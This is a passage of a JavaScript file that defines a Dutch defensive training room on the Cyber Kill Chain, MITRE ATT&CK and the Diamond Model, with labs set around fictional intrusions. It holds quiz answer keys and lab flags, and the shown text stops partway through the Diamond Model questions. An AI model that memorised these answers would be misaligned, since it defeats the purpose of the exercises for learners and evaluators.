/* Room: Threat intelligence-modellen (Cyber Kill Chain, MITRE ATT&CK, Diamond Model, Pyramid of Pain) */

CS.registerRoom({
  id: 'ti-modellen',
  path: 'intelligence',
  order: 4,
  title: 'Threat intelligence-modellen',
  icon: '🔗',
  difficulty: 'Gemiddeld',
  minutes: 70,
  level: 'Praktijk',
  checked: '2026-11-12',
  summary: 'Vier klassieke modellen om aanvallen te beschrijven, vergelijken en delen: de Cyber Kill Chain, MITRE ATT&CK, het Diamond Model en de Pyramid of Pain. Je leert ze naast elkaar gebruiken en plaatst één gebeurtenis in alle vier.',
  objectives: [
    'De zeven fasen van de Cyber Kill Chain benoemen en een aanval erin plaatsen',
    'Uitleggen hoe MITRE ATT&CK tactieken, technieken en procedures (TTP\'s) ordent, hoe technieken gecodeerd worden en waar de Navigator voor dient',
    'De vier hoekpunten en de meta-kenmerken van het Diamond Model beschrijven en langs de randen pivoten tussen incidenten',
    'Met de Pyramid of Pain prioriteit geven aan detectie, van hashes onderaan tot TTP\'s bovenaan',
    'De vier modellen naast elkaar gebruiken en uitleggen welk model welke vraag het beste beantwoordt',
  ],
  tasks: [
    {
      title: 'Taak 1 — Waarom modellen?',
      content: `
        <p>In de defensieve room <strong>"Threat intelligence &amp; MITRE ATT&amp;CK"</strong> heb je al geoefend met
        indicatoren (IOC's), defangen, TLP en het koppelen van logregels aan ATT&amp;CK. Die room gaat over het
        <em>handwerk</em> van een analist. Deze room gaat over de <strong>modellen</strong> zelf: de denkramen waarmee je
        een aanval structuur geeft. We dupliceren dat werk niet, maar bouwen erop voort.</p>

        <h3>Een model is een bril</h3>
        <p>Vergelijk het met een stadsplattegrond. Een toeristenkaart laat de bezienswaardigheden zien, een fietskaart de
        routes, een metrokaart de lijnen. Geen enkele kaart is "de echte stad", maar elke kaart maakt een bepaalde vraag
        makkelijker te beantwoorden. Zo werken threat intelligence-modellen ook: elk belicht een ander <em>aspect</em> van
        dezelfde aanval. Je kiest de bril die bij je vraag past, en vaak gebruik je er meerdere naast elkaar.</p>

        <h3>Waar modellen je bij helpen</h3>
        <ul>
          <li><strong>Structuur</strong>: een chaotisch incident wordt een reeks herkenbare stappen.</li>
          <li><strong>Gedeelde taal</strong>: als jij en een partner allebei "T1566" of "de Delivery-fase" zeggen,
          bedoelen jullie precies hetzelfde. Dat maakt delen en vergelijken mogelijk.</li>
          <li><strong>Blinde vlekken vinden</strong>: een model laat zien welke stappen je nog <em>niet</em> kunt zien of
          stoppen.</li>
          <li><strong>Prioriteren</strong>: niet alles is even belangrijk; een model helpt kiezen waar je je tijd in steekt.</li>
        </ul>

        <h3>De vier modellen in deze room</h3>
        <table>
          <thead><tr><th>Model</th><th>Hoofdvraag</th><th>Kort</th></tr></thead>
          <tbody>
            <tr><td>Cyber Kill Chain</td><td>In welke <em>fase</em> zit de aanval?</td><td>Zeven schakels, van verkenning tot het doel</td></tr>
            <tr><td>MITRE ATT&amp;CK</td><td>Wélk gedrag (TTP) zie ik precies?</td><td>Gedetailleerde kennisbank met gecodeerde technieken</td></tr>
            <tr><td>Diamond Model</td><td>Hoe hangen de <em>elementen</em> samen?</td><td>Tegenstander, vermogen, infrastructuur, slachtoffer</td></tr>
            <tr><td>Pyramid of Pain</td><td>Wat raakt de aanvaller het <em>hardst</em>?</td><td>Van hashes (makkelijk) tot TTP's (moeilijk)</td></tr>
          </tbody>
        </table>

        <div class="callout info">
          <strong>Let op:</strong> modellen zijn hulpmiddelen, geen wetten. Een echte aanval past zelden netjes in één
          vakje, en analisten delen dingen soms net iets anders in. Gebruik een model om helder te denken en te
          communiceren, niet om een discussie te winnen over "het juiste vakje".
        </div>
      `,
      questions: [
        { q: 'Wat is de belangrijkste meerwaarde van een threat intelligence-model?', options: ['Het geeft structuur en een gedeelde taal om aanvallen te beschrijven, vergelijken en delen', 'Het blokkeert automatisch elke aanval', 'Het vervangt je firewall en antivirus', 'Het versleutelt je logbestanden'], answer: 0, explain: 'Een model is een denkraam: het ordent de aanval en geeft iedereen dezelfde woorden.' },
        { q: 'Welke uitspraak over de vier modellen klopt?', options: ['Je gebruikt ze vaak naast elkaar; elk model belicht een ander aspect van dezelfde aanval', 'Je mag er maar één tegelijk gebruiken', 'Het nieuwste model maakt de oudere overbodig', 'Ze beschrijven allemaal exact hetzelfde'], answer: 0, explain: 'Net als verschillende stadskaarten: elk model beantwoordt een andere vraag over dezelfde werkelijkheid.' },
        { q: 'Een collega vraagt: "Hebben we een detectieregel voor dit precieze gedrag, en zo nee, waar zit het gat?" Welk van de vier modellen pak je erbij?', answer: ['MITRE ATT&CK', 'ATT&CK', 'attack', 'att&ck navigator'],
          hints: ['Kijk in de tabel welke hoofdvraag bij elk model hoort.', 'De vraag gaat over precies gedrag en over dekking, niet over de fase of over prioriteit.', 'Het is de kennisbank met gecodeerde technieken.'],
          wrong: { 'pyramid of pain': 'De Pyramid zegt waar detectie het meeste oplevert, niet welk gedrag je precies wel of niet afdekt.', 'cyber kill chain': 'De Kill Chain geeft de fase. Voor de vraag "welk gedrag precies" is hij te grof.', 'kill chain': 'De Kill Chain geeft de fase. Voor de vraag "welk gedrag precies" is hij te grof.', 'diamond model': 'Het Diamond Model verbindt elementen en zaken. Het zegt niets over je detectiedekking.' },
          explain: 'ATT&CK beschrijft gedrag per techniek. Leg je detectieregels ernaast, dan zie je per techniek of je iets hebt of niet.' },
      ],
    },

    {
      title: 'Taak 2 — De Cyber Kill Chain',
      tryFirst: true,
      intro: `<p>In het lab staan zeven gebeurtenissen uit één aanval op een fictief installatiebedrijf, door elkaar. Zet ze in
        de volgorde waarin ze plaatsvonden. Daarna beantwoord je de vragen over de plek van losse gebeurtenissen.</p>`,
      content: `
        <p>Het oudste en eenvoudigste model is de <strong>Cyber Kill Chain</strong>, in 2011 bedacht door Lockheed Martin.
        De term komt uit het leger: een "kill chain" is de keten van stappen die nodig is om een doel uit te schakelen.
        Het idee is krachtig: <em>verbreek je één schakel, dan mislukt de hele aanval</em>. Je hoeft een aanvaller dus niet
        pas aan het einde te stoppen; hoe eerder in de keten je ingrijpt, hoe beter.</p>

        <h3>De zeven schakels</h3>
        <figure class="diagram">
          <svg viewBox="0 0 700 120" role="img" aria-label="De zeven fasen van de Cyber Kill Chain">
            <rect x="8" y="24" width="86" height="40" rx="8" fill="var(--accent-soft)" stroke="currentColor"/>
            <rect x="102" y="24" width="86" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="196" y="24" width="86" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="290" y="24" width="86" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="384" y="24" width="86" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="478" y="24" width="86" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="572" y="24" width="120" height="40" rx="8" fill="var(--surface-2)" stroke="currentColor"/>
            <text x="51" y="49" text-anchor="middle" fill="currentColor" font-size="13">1</text>
            <text x="145" y="49" text-anchor="middle" fill="currentColor" font-size="13">2</text>
            <text x="239" y="49" text-anchor="middle" fill="currentColor" font-size="13">3</text>
            <text x="333" y="49" text-anchor="middle" fill="currentColor" font-size="13">4</text>
            <text x="427" y="49" text-anchor="middle" fill="currentColor" font-size="13">5</text>
            <text x="521" y="49" text-anchor="middle" fill="currentColor" font-size="13">6</text>
            <text x="632" y="49" text-anchor="middle" fill="currentColor" font-size="13">7</text>
            <text x="51" y="84" text-anchor="middle" fill="currentColor" font-size="11">verkenning</text>
            <text x="145" y="84" text-anchor="middle" fill="currentColor" font-size="11">bewapening</text>
            <text x="239" y="84" text-anchor="middle" fill="currentColor" font-size="11">bezorging</text>
            <text x="333" y="84" text-anchor="middle" fill="currentColor" font-size="11">uitbuiting</text>
            <text x="427" y="84" text-anchor="middle" fill="currentColor" font-size="11">installatie</text>
            <text x="521" y="84" text-anchor="middle" fill="currentColor" font-size="11">C2</text>
            <text x="632" y="84" text-anchor="middle" fill="currentColor" font-size="11">acties op doel</text>
            <line x1="94" y1="44" x2="102" y2="44" stroke="currentColor"/>
            <line x1="188" y1="44" x2="196" y2="44" stroke="currentColor"/>
            <line x1="282" y1="44" x2="290" y2="44" stroke="currentColor"/>
            <line x1="376" y1="44" x2="384" y2="44" stroke="currentColor"/>
            <line x1="470" y1="44" x2="478" y2="44" stroke="currentColor"/>
            <line x1="564" y1="44" x2="572" y2="44" stroke="currentColor"/>
          </svg>
          <figcaption>De zeven fasen van de Cyber Kill Chain. Verbreek één schakel en de aanval valt stil.</figcaption>
        </figure>
        <ol>
          <li><strong>Reconnaissance</strong> (verkenning) — de aanvaller verzamelt informatie: wie werkt er, welke
          e-mailadressen, welke software draait er, waar zitten de zwakke plekken?</li>
          <li><strong>Weaponization</strong> (bewapening) — hij maakt zijn wapen klaar, bijvoorbeeld een kwaadaardig
          Word-document met een macro, gekoppeld aan een exploit. Dit gebeurt nog bij de aanvaller thuis; je ziet er als
          verdediger niets van.</li>
          <li><strong>Delivery</strong> (bezorging) — het wapen wordt afgeleverd: een phishingmail met bijlage, een
          kwaadaardige link, een besmette USB-stick.</li>
          <li><strong>Exploitation</strong> (uitbuiting) — het slachtoffer opent de bijlage of klikt; de kwetsbaarheid
          wordt misbruikt en de code wordt voor het eerst uitgevoerd.</li>
          <li><strong>Installation</strong> (installatie) — de aanvaller nestelt zich: hij installeert malware of een
          achterdeurtje zodat hij ook na een herstart binnen blijft.</li>
          <li><strong>Command and Control</strong> (C2) — de besmette machine neemt contact op met de server van de
          aanvaller, die zo op afstand commando's kan geven.</li>
          <li><strong>Actions on Objectives</strong> (acties op het doel) — nu pas voert de aanvaller zijn eigenlijke
          plan uit: data stelen, bestanden versleutelen, zich verspreiden naar andere systemen.</li>
        </ol>

        <h3>Sterk en zwak</h3>
        <p>De Kill Chain is fijn om een aanval in grote lijnen uit te leggen aan iemand die geen specialist is, en om te
        laten zien dat je vroeg kunt ingrijpen. Haal de phishingmail eruit (fase 3) en de rest gebeurt nooit. De zwakte:
        het model is sterk gericht op <em>binnenkomen</em> en behandelt alles ná de inbraak als één grote laatste fase.
        Juist dat latere deel — rondkijken, rechten verhogen, zijdelings bewegen — is in de praktijk heel belangrijk.
        Daar is MITRE ATT&amp;CK veel beter in, zoals je in de volgende taak ziet.</p>

      `,
      lab: {
        type: 'ordering',
        title: 'aanval op Installatiebedrijf Hoekstra',
        prompt: 'Zeven gebeurtenissen uit de aanval op het fictieve Installatiebedrijf Hoekstra. Zet ze in de volgorde van de Cyber Kill Chain.',
        items: [
          { id: 'k1', label: 'De aanvaller zoekt op de website en op sociale media de namen en e-mailadressen van de financiële afdeling op.' },
          { id: 'k2', label: 'Op zijn eigen computer bouwt hij een Word-document met een macro die een loader downloadt.' },
          { id: 'k3', label: 'De mail "Herinnering factuur 2026-0412" met het document komt binnen bij een medewerker van de crediteurenadministratie.' },
          { id: 'k4', label: 'De medewerker opent het document en klikt op "Inhoud inschakelen"; de macro wordt uitgevoerd.' },
          { id: 'k5', label: 'De loader zet een geplande taak neer, zodat hij na elke herstart opnieuw start.' },
          { id: 'k6', label: 'Het werkstation maakt elke 60 seconden verbinding met update-check[.]nm[.]lab en wacht op opdrachten.' },
          { id: 'k7', label: 'De aanvaller kopieert de map met loonstroken naar buiten en versleutelt daarna de fileserver.' },
        ],
        correct: ['k1', 'k2', 'k3', 'k4', 'k5', 'k6', 'k7'],
        flag: 'NM{verbreek_een_schakel}',
        explain: 'Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.',
      },
      questions: [
        { q: 'Op welke plek (1 tot 7) staat de gebeurtenis waarbij de macro wordt uitgevoerd?', answer: ['4', 'plek 4'],
          hints: ['Bedenk wat er eerst moet zijn gebeurd: het document moet gemaakt en bezorgd zijn.', 'Uitvoeren van de code is de fase Exploitation.', 'Het komt direct na de bezorging van de mail.'],
          wrong: { '3': 'Plek 3 is de bezorging: de mail komt binnen. De macro draait pas als de medewerker het document opent.', '5': 'Plek 5 is de installatie: de loader zorgt dat hij blijft. Daarvoor moet de code eerst één keer zijn uitgevoerd.' },
          explain: 'Plek 4, Exploitation: de code van de aanvaller wordt voor het eerst uitgevoerd op het systeem van het slachtoffer.' },
        { q: 'In welke fase maakt de aanvaller zijn wapen klaar, bijvoorbeeld een kwaadaardig document met een exploit?', options: ['Reconnaissance', 'Weaponization', 'Delivery', 'Installation'], answer: 1, explain: 'Weaponization (bewapening) gebeurt bij de aanvaller zelf; als verdediger zie je er nog niets van.' },
        { q: 'Eén van de zeven gebeurtenissen kan Hoekstra met geen enkel eigen log of filter zien. Op welke plek staat die?', answer: ['2', 'plek 2'],
          hints: ['Welke gebeurtenis speelt zich volledig af buiten het netwerk en de website van het slachtoffer?', 'De verkenning laat nog sporen na in weblogs. Eén stap daarna niet.', 'Het is de stap waarin het document wordt gebouwd.'],
          wrong: { '1': 'Verkenning kan sporen nalaten, bijvoorbeeld in de weblogs van de eigen site. De volgende stap gebeurt volledig bij de aanvaller.', '6': 'C2-verkeer is juist goed te zien in firewall- en proxylogs.' },
          why: 'Je kunt alleen ingrijpen in schakels die je kunt waarnemen. Dit model laat meteen zien waar je blind bent en waar je eerste kans ligt: de bezorging.',
          explain: 'Plek 2, Weaponization. Het document wordt op de computer van de aanvaller gebouwd; de eerste schakel waar Hoekstra iets kan tegenhouden is Delivery.' },
        { q: 'Welke vlag toont het lab als alle zeven gebeurtenissen goed staan?', answer: ['NM{verbreek_een_schakel}'],
          hints: ['De knop "Controleer volgorde" zegt hoeveel er goed staan.', 'Begin met opzoeken van namen, eindig met kopiëren en versleutelen.', 'Namen opzoeken, document bouwen, mail komt binnen, macro draait, geplande taak, verbinding elke 60 seconden, loonstroken en versleuteling.'],
          explain: 'Verbreek je één schakel, dan komt de aanvaller niet bij de volgende. Hoe eerder, hoe beter.' },
      ],
    },

    {
      title: 'Taak 3 — MITRE ATT&CK: tactieken, technieken en procedures',
      tryFirst: true,
      intro: `<p>In het lab staan zeven waarnemingen uit een fictieve inbraak. Koppel elke waarneming aan de juiste
        ATT&amp;CK-techniek uit de keuzelijst. Het lab toont na controle de naam en de tactiek; die heb je nodig voor de vragen.</p>`,
      content: `
        <p>Waar de Kill Chain grof is, is <strong>MITRE ATT&amp;CK</strong> fijnmazig. Het is een openbare, gratis
        kennisbank van aanvalsgedrag, gebaseerd op echt waargenomen aanvallen. De 14 Enterprise-tactieken en een reeks
        veelgebruikte technieken komen uitgebreid aan bod in de room "Threat intelligence &amp; MITRE ATT&amp;CK"; hier
        kijken we naar de <em>logica</em> van het model: hoe het TTP's ordent en codeert.</p>

        <h3>Tactiek, techniek, procedure (TTP)</h3>
        <ul>
          <li>Een <strong>tactiek</strong> is het <em>waarom</em>: het doel van de aanvaller in een stap, bijvoorbeeld
          "inloggegevens stelen" (Credential Access). ATT&amp;CK kent 14 van deze tactieken, van Reconnaissance tot Impact.</li>
          <li>Een <strong>techniek</strong> is het <em>hoe</em>: de manier waarop hij dat doel bereikt, bijvoorbeeld
          "het geheugen van processen uitlezen". Sommige technieken zijn verder opgesplitst in <strong>sub-technieken</strong>.</li>
          <li>Een <strong>procedure</strong> is de <em>precieze uitvoering</em> door een bepaalde groep: welke tool, welke
          commando's, welke opties. Dezelfde techniek, maar groep A doet het net anders dan groep B.</li>
        </ul>

        <h3>De codering</h3>
        <p>Elke techniek heeft een vast ID in de vorm <code>T</code> plus vier cijfers. Een sub-techniek krijgt er een
        punt en drie cijfers bij:</p>
        <table>
          <thead><tr><th>Code</th><th>Betekenis</th></tr></thead>
          <tbody>
            <tr><td><code>T1566</code></td><td>Phishing (de techniek)</td></tr>
            <tr><td><code>T1566.001</code></td><td>Spearphishing Attachment (een sub-techniek van Phishing)</td></tr>
            <tr><td><code>T1059</code></td><td>Command and Scripting Interpreter</td></tr>
            <tr><td><code>T1059.001</code></td><td>PowerShell (sub-techniek)</td></tr>
            <tr><td><code>T1003.001</code></td><td>OS Credential Dumping: LSASS Memory (LSASS-geheugen uitlezen)</td></tr>
            <tr><td><code>T1021.001</code></td><td>Remote Services: Remote Desktop Protocol (RDP)</td></tr>
          </tbody>
        </table>
        <p>Door dit nummer kun je wereldwijd precies hetzelfde gedrag aanwijzen. "We zagen T1566.001 gevolgd door
        T1059.001" is ondubbelzinnig, in elke taal.</p>

        <h3>De Navigator en de heatmap</h3>
        <p>De <strong>ATT&amp;CK Navigator</strong> is een gratis webtool waarin je de hele matrix als een raster ziet.
        Je kunt technieken inkleuren om een <strong>heatmap</strong> te maken, bijvoorbeeld: groen = "detecteren we",
        rood = "blinde vlek", of je kleurt de technieken van een aanvalsgroep die jouw sector bedreigt. Zo zie je in één
        oogopslag waar je sterk staat en waar je gaten zitten. Begin altijd bij de technieken die voor <em>jouw</em>
        organisatie het belangrijkst zijn, niet bij de hele matrix.</p>

        <h3>Oefening: waarnemingen koppelen</h3>
        <p>In het lab koppel je waarnemingen uit een (fictieve) inbraak aan de juiste ATT&amp;CK-techniek. Kies de
        <em>techniek</em>, niet alleen de tactiek, en waar het kan de sub-techniek. Het lab toont bij controle de naam en de
        tactiek.</p>

        <div class="callout info">
          <strong>Ethiek:</strong> ATT&amp;CK beschrijft aanvalstechnieken om je te verdedigen. Technieken naspelen doe
          je alleen in je eigen lab of met schriftelijke toestemming; zonder toestemming is het computervredebreuk
          (art. 138ab Sr).
        </div>
      `,
      lab: {
        type: 'attackmap',
        items: [
          { desc: 'Een medewerker opent de bijlage factuur_sep.zip uit een mail van een nep-leverancier; in het archief zit een kwaadaardige snelkoppeling.', code: 'T1566.001', explain: 'Een gerichte phishingmail met een kwaadaardige bijlage is Spearphishing Attachment, tactiek Initial Access.' },
          { desc: 'Vanuit de snelkoppeling start een verborgen powershell.exe met een gecodeerd (-enc) commando.', code: 'T1059.001', explain: 'PowerShell als uitvoerder van kwaadaardige code valt onder Command and Scripting Interpreter, tactiek Execution.' },
          { desc: 'De loader leest het geheugen van het proces lsass.exe uit om wachtwoorden en hashes te bemachtigen.', code: 'T1003.001', explain: 'LSASS Memory is een sub-techniek van OS Credential Dumping, tactiek Credential Access.' },
          { desc: 'Met een gestolen, geldig beheerdersaccount logt de aanvaller via RDP in op een fileserver.', code: 'T1021.001', explain: 'Inloggen via Remote Desktop Protocol is een sub-techniek van Remote Services, tactiek Lateral Movement.' },
          { desc: 'De aanvaller stopt de buitgemaakte bestanden in een met wachtwoord beveiligd 7z-archief voordat ze naar buiten gaan.', code: 'T1560', explain: 'Data inpakken voor exfiltratie is Archive Collected Data, tactiek Collection.' },
          { desc: 'Tot slot worden alle bestanden op de fileshares versleuteld en verschijnt er een losgeldbrief.', code: 'T1486', explain: 'Bestanden onbruikbaar maken voor losgeld is Data Encrypted for Impact, tactiek Impact.' },
          { desc: 'Vlak voor de versleuteling verwijdert de aanvaller alle schaduwkopieën met vssadmin, zodat terugzetten niet meer kan.', code: 'T1490', explain: 'Herstelmogelijkheden slopen is Inhibit System Recovery, tactiek Impact.' },
        ],
      },
      questions: [
        { q: 'Welk techniek-ID geeft het lab voor het inpakken van de buit in een 7z-archief?', answer: ['T1560'],
          hints: ['Zoek in de keuzelijst een techniek over het archiveren van verzamelde data.', 'De naam is Archive Collected Data.', 'Het ID begint met T15.'],
          wrong: { 't1041': 'Dat is het wegsturen zelf, over het C2-kanaal. Inpakken gebeurt daarvóór en is een eigen techniek.', 't1567': 'Dat is het wegsturen naar een webdienst. Inpakken gebeurt daarvóór en is een eigen techniek.', 't1486': 'Dat is versleutelen om schade aan te richten. Een archief met wachtwoord dient hier om de buit mee te nemen.' },
          explain: 'T1560 Archive Collected Data, tactiek Collection.' },
        { q: 'Wat betekent de .001 in een ID als T1059.001?', options: ['Een sub-techniek: een specifiekere variant, hier PowerShell', 'De versie van ATT&CK', 'Het aantal slachtoffers', 'De naam van de aanvalsgroep'], answer: 0, explain: 'Na de punt staat de sub-techniek. T1059.001 is PowerShell binnen Command and Scripting Interpreter.' },
        { q: 'Waarvoor gebruik je de ATT&CK Navigator?', options: ['Technieken in de matrix inkleuren als heatmap, bijvoorbeeld je detectiedekking of blinde vlekken', 'Malware schrijven', 'Wachtwoorden kraken', 'Netwerkverkeer opnemen'], answer: 0, explain: 'De Navigator maakt een heatmap over de matrix: waar sta je sterk, waar zitten gaten?' },
        { q: 'Welk techniek-ID hoort bij het verwijderen van de schaduwkopieën?', answer: ['T1490'],
          hints: ['Het doel is dat het slachtoffer niet kan herstellen.', 'Zoek in de keuzelijst naar Inhibit System Recovery.', 'Het ID ligt vlak na dat van Data Encrypted for Impact.'],
          wrong: { 't1486': 'Dat is de versleuteling zelf. Het wissen van de schaduwkopieën is een aparte stap met een eigen ID.' },
          explain: 'T1490 Inhibit System Recovery. Een bekend voorsignaal van ransomware: wie dit ziet, heeft nog minuten.' },
        { q: 'Onder welke tactiek valt volgens het lab de RDP-aanmelding met het gestolen beheerdersaccount?', answer: ['Lateral Movement', 'lateral-movement', 'laterale beweging'],
          hints: ['Vraag je af wat het doel van deze stap is, niet welk middel wordt gebruikt.', 'Controleer de waarneming in het lab: de tactiek staat tussen haakjes achter de naam.', 'De aanvaller verplaatst zich van het ene systeem naar het andere.'],
          wrong: { 'initial access': 'De aanvaller is al binnen. Hij gebruikt het account om bij een tweede systeem te komen.', 'credential access': 'Dat was de stap ervoor, het uitlezen van LSASS. Nu gebruikt hij wat hij daar vond.', 'persistence': 'Een geldig account kan ook voor blijvende toegang dienen, maar hier is het doel de fileserver bereiken.' },
          why: 'Dezelfde handeling kan onder meerdere tactieken vallen. De tactiek is het doel van de aanvaller op dat moment, en dat bepaalt welke verdediging helpt.',
          explain: 'T1021.001 Remote Desktop Protocol, tactiek Lateral Movement.' },
      ],
    },

    {
      title: 'Taak 4 — Het Diamond Model',
      tryFirst: true,
      intro: `<p>In het lab liggen vier incidenten, elk beschreven met de vier hoekpunten van een diamant. Welke horen bij
        elkaar, en waarom? Let op: niet elk gedeeld kenmerk is even veel waard.</p>`,
      content: `
        <p>De Kill Chain en ATT&amp;CK beschrijven de <em>stappen</em> van een aanval. Het <strong>Diamond Model</strong>
        (Caltagirone, Pendergast en Betz, 2013) kijkt anders: het beschrijft de <em>elementen</em> van één gebeurtenis en
        hoe ze samenhangen. Het is vooral sterk om losse incidenten te verbinden tot een groter geheel, iets waar
        opsporing en attributie veel aan hebben.</p>

        <h3>De vier hoekpunten</h3>
        <figure class="diagram">
          <svg viewBox="0 0 480 330" role="img" aria-label="Het Diamond Model met vier hoekpunten">
            <polygon points="240,45 420,170 240,295 60,170" fill="var(--accent-soft)" stroke="currentColor"/>
            <line x1="240" y1="45" x2="240" y2="295" stroke="currentColor" stroke-dasharray="4 4"/>
            <line x1="60" y1="170" x2="420" y2="170" stroke="currentColor" stroke-dasharray="4 4"/>
            <text x="240" y="32" text-anchor="middle" fill="currentColor" font-size="13">Adversary</text>
            <text x="240" y="318" text-anchor="middle" fill="currentColor" font-size="13">Victim</text>
            <text x="60" y="192" text-anchor="middle" fill="currentColor" font-size="13">Infrastructure</text>
            <text x="420" y="192" text-anchor="middle" fill="currentColor" font-size="13">Capability</text>
          </svg>
          <figcaption>Het Diamond Model. De verticale as (Adversary &lt;-&gt; Victim) is de socio-politieke relatie; de
          horizontale as (Infrastructure &lt;-&gt; Capability) is de technische relatie.</figcaption>
        </figure>
        <ul>
          <li><strong>Adversary</strong> (tegenstander) — wie zit erachter: de persoon of groep.</li>
          <li><strong>Capability</strong> (vermogen) — wat hij kan: de malware, exploits, tools en technieken (de TTP's).</li>
          <li><strong>Infrastructure</strong> (infrastructuur) — wat hij gebruikt: C2-servers, domeinen, IP-adressen,
          mailaccounts.</li>
          <li><strong>Victim</strong> (slachtoffer) — wie geraakt wordt: de organisatie, persoon, of een specifiek systeem.</li>
        </ul>
        <p>De kern: in elke gebeurtenis gebruikt een <em>tegenstander</em> een <em>vermogen</em> via een
        <em>infrastructuur</em> tegen een <em>slachtoffer</em>. De twee diagonalen zijn de assen van het model: de
        <strong>socio-politieke as</strong> (de relatie en motieven tussen aanvaller en slachtoffer) en de
        <strong>technische as</strong> (de relatie tussen de infrastructuur en de capability).</p>

        <h3>Meta-kenmerken</h3>
        <p>Rond de vier hoekpunten noteer je <strong>meta-kenmerken</strong>: tijdstip, fase, resultaat, richting van de
        actie, methode, en vooral de <em>herkomst en betrouwbaarheid</em> van elk gegeven. Zo blijft zichtbaar wat je
        zeker weet (bekend) en wat je afleidt of aanneemt.</p>

        <h3>Threads, groups en pivoten</h3>
        <ul>
          <li>Een reeks samenhangende gebeurtenissen van begin tot eind heet een <strong>activity thread</strong>
          (activiteitsdraad) — je kunt die naast de Kill Chain-fasen leggen.</li>
          <li>Diamanten die kenmerken delen, bundel je tot een <strong>activity group</strong> (activiteitengroep): het
          begin van een campagne of dadergroep.</li>
          <li><strong>Pivoten</strong> is de superkracht van het model: je springt van het ene hoekpunt naar het andere
          langs de <em>randen</em>. Vind je een C2-domein (Infrastructure), dan zoek je welke andere slachtoffers ermee
          verbonden zijn (Victim), of welke malware erop draaide (Capability). Zo groeit één losse waarneming uit tot een
          compleet beeld.</li>
        </ul>
        <p><strong>Voorbeeld:</strong> twee ogenschijnlijk losse phishingzaken blijken hetzelfde TLS-certificaat te
        gebruiken. Via dat gedeelde kenmerk (Infrastructure) pivoteer je van Zaak A naar Zaak B en bundel je ze tot één
        activity group. In de room over OSINT &amp; pivoting oefen je dit met een echte dataset.</p>

        <div class="callout tip">
          <strong>Onthoud:</strong> het Diamond Model draait om verbinden. Je pivoteert langs de randen van de ene
          waarneming naar de volgende.
        </div>
      `,
      lab: {
        type: 'osintpuzzle',
        title: 'vier diamanten',
        scenario: 'Vier incidenten bij kleine bedrijven in dezelfde regio, voorjaar 2026. Van geen enkel incident is de dader bekend.',
        records: [
          { title: 'Incident 1 (2026-03-04)', lines: ['Victim: Bakkerij Groothuis', 'Capability: loader "Meelworm" in een ZIP met snelkoppeling', 'Infrastructure: C2 kassa-sync.nm.lab op 203.0.113.30', 'Adversary: onbekend'] },
          { title: 'Incident 2 (2026-03-19)', lines: ['Victim: Tandartspraktijk De Linde', 'Capability: Word-document met macro', 'Infrastructure: C2 afspraak-portal.nm.lab op 198.51.100.61', 'Adversary: onbekend'] },
          { title: 'Incident 3 (2026-04-02)', lines: ['Victim: Slagerij Van Bruggen', 'Capability: loader "Meelworm" in een ZIP met snelkoppeling', 'Infrastructure: C2 voorraad-sync.nm.lab op 203.0.113.30', 'Adversary: onbekend'] },
          { title: 'Incident 4 (2026-04-11)', lines: ['Victim: Garage Postma', 'Capability: loader "Meelworm"', 'Infrastructure: C2 werkorder.nm.lab op 192.0.2.90', 'Adversary: onbekend'] },
          { title: 'Notitie analist', lines: ['"Meelworm" wordt sinds februari 2026 gratis verspreid op een forum.', '203.0.113.30 is een losse VPS; passive DNS kent er alleen de twee C2-domeinen op.'] },
        ],
      },
      questions: [
        { q: 'Welke twee incidenten bundel je tot één activity group? Geef de nummers, bijvoorbeeld 2+4.', answer: ['1+3', '3+1', '1 en 3', '3 en 1', '1,3', '1, 3', '1 3', '1 & 3'],
          hints: ['Zoek hoekpunten die in meer dan één diamant dezelfde waarde hebben.', 'Er zijn twee gedeelde kenmerken: een loader en een IP-adres. Lees de notitie van de analist om te bepalen welk van de twee zeldzaam is.', 'De loader is gratis verkrijgbaar en zegt dus weinig. Het IP-adres is een losse VPS met alleen deze twee domeinen.'],
          wrong: { '1+4': 'Deze twee delen alleen de loader, en die is gratis op een forum te krijgen. Een gedeeld gereedschap bewijst geen gedeelde dader.', '3+4': 'Deze twee delen alleen de loader, en die is gratis op een forum te krijgen. Een gedeeld gereedschap bewijst geen gedeelde dader.', '1+3+4': 'Incident 4 deelt alleen de loader, en die is vrij verkrijgbaar. De infrastructuur van incident 4 staat los van de andere twee.', '/2/': 'Incident 2 deelt geen enkel hoekpunt met de andere drie.' },
          why: 'Wie op een vrij verkrijgbare tool groepeert, schrijft straks tien losse daders toe aan één "groep". Dat stuurt een onderzoek de verkeerde kant op.',
          explain: 'Incident 1 en 3 delen een specifiek stuk infrastructuur (dezelfde losse VPS) én de loader. Incident 4 deelt alleen de loader. Dat is een aanwijzing om te onthouden, geen grond om te bundelen.' },
        { q: 'Welke vier hoekpunten zijn het?', options: ['Adversary, Capability, Infrastructure, Victim', 'Reconnaissance, Delivery, Exploitation, Impact', 'Hashes, IP-adressen, Domeinen, TTP\'s', 'Tactiek, Techniek, Procedure, Tool'], answer: 0, explain: 'In elke gebeurtenis gebruikt een tegenstander een vermogen via infrastructuur tegen een slachtoffer.' },
        { q: 'Je ontdekt dat twee aparte incidenten hetzelfde C2-domein gebruiken. Wat doe je volgens het Diamond Model?', options: ['Pivoten langs de rand: via de gedeelde infrastructuur verbind je de zaken en kom je bij nieuwe slachtoffers of capabilities', 'De incidenten negeren omdat domeinen makkelijk te wisselen zijn', 'Alleen het domein blokkeren en stoppen', 'De twee zaken apart houden, want ze mogen nooit verbonden worden'], answer: 0, explain: 'Een gedeeld hoekpunt (hier Infrastructure) is een brug: je pivoteert langs de randen en bouwt een activity group.' },
        { q: 'Welk gegeven is het gedeelde Infrastructure-kenmerk waarlangs je van het ene naar het andere incident pivoteert?', answer: ['203.0.113.30', '203.0.113[.]30'],
          hints: ['Het staat in de regel Infrastructure van twee diamanten.', 'De C2-domeinen verschillen. Wat erachter zit niet.', 'Het is een IP-adres dat begint met 203.'],
          wrong: { 'meelworm': 'De loader is Capability, niet Infrastructure, en hij is vrij verkrijgbaar.', '/sync\\.nm\\.lab/': 'De twee domeinnamen lijken op elkaar maar zijn verschillend. Ze wijzen wel naar hetzelfde adres.' },
